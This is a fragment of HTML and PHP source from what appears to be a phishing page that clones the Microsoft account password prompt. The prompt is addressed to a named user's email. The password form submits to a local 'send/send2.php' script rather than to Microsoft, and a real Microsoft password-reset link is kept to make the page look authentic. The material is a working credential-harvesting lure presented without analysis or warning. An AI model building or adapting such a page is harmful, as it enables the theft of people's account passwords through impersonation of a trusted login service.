...
?>
    ...
    <body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb remove-segoe-ui-symbol" style=display:block>
        ...
        <div>
            ...
            <form name=password id=i0281 spellcheck=false method=post target=_top autocomplete=off data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.fUseMinHeight }" action=./send/send2.php
        ...
        'slide-in-back': animate.isSlideInBack() }">
            ...
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }">
                                                                                ...
                                                                                <input name=password type=password id=i0118 required class="form-control input ext-input text-box ext-text-box" aria-required=true data-bind="
                ...
                externalCss: {
                    ...
                    'has-error': passwordTextbox.error }" aria-describedby="loginHeader passwordError  " placeholder=Password aria-label="Enter the password for jpavlov@cgimg.com" tabindex=0 value>
                            ...
                            click: accessRecoveryLink ? null : resetPassword_onClick" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAjZI9jNt0GMbj5C69i4CeSoX4GDgQQgjhxPn7MydVIomd2MnFvksc5-KhVi62E387_rYnRsYKxIc6MHQ8hiLEUJgY0U0dWOiGhIRUqVUFS8emZWFBYnn1Pnqe912eX22PqKNYHakjH1ZAHTl6DyMJHMPwcxgFSwLGWucITKEaATfVFrq1AEksF8G12kEd__qm9PYXzGd3f3zzzg-P37mA3l9HkR8eNRppmtYdYxl4oadHKIHXl57TsBeuarirBNyDoPsQdLu8q7nwdHJRDgmUQimSRIkmRjUBhSJkXaYtfFTMM6F_GvEmV8hdBJmLc_R4xgHZHEVzwK-FvmTLIoOPaMkamVzKF7w5oqcRXwwsYZvnTQs7FlfZNhPJJpPx5mDN95l0RPPrB-WrQjuO1uD58AKj0P4q7-te4Ci-F0a3K9-Wx6EkNxkripvipujQdpTnx_ICF33Wag-KILMNCk6KcDVOCMwdKwOgrQJtwcJCyJ0AMRY0QHezocud69JJLAoKZm1wy-9QAIeJidspVMluUZmMKFRyEurEzOTHMDcdLgR5wiZncNjkesyp2uthsyLsR8X2B2qHnMWTfayAl9JgnHFp7CDwwC_m8hCb0oK50TpncjHcdBGNZzptFKxP3ZUac-s8m4gbu0_rCtahiWkyZ1c4rySqhfdCazNhYRAM0zNpTXcGHZOEFVvXz7o9F1F7eDTR0jliM4UNkgIJEFFwwmDNxtxUEvIoTuLW1LuovPHv5j1dN5bai84T8H2lul0cz72skJ6vuYZ66Aeebtja4X_eNIQXivUcrd627fs70MOd1_aqB---XjosfXAdqRzt7dUOSs_V0x3ozu4WxvDXyHfe-urjz__47e_Kn49Kl7uN42AeisvFCRjP8iZNj1KN5U-N1YAcdPN5PAywRhrniWo2u96N1lHzVhW6Va1eVvc5WuEZkVCQJ1Xo0yuln_b_J9YPXnq1VosNxfaWC1sLr_2D988vl56-cveb37-898snj9mHVz9SvRyZgUTqGmkXz1xuwbZIQsrPHU3MI0HHJFrw24GYT1rtG98dlJ4B0&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+10"
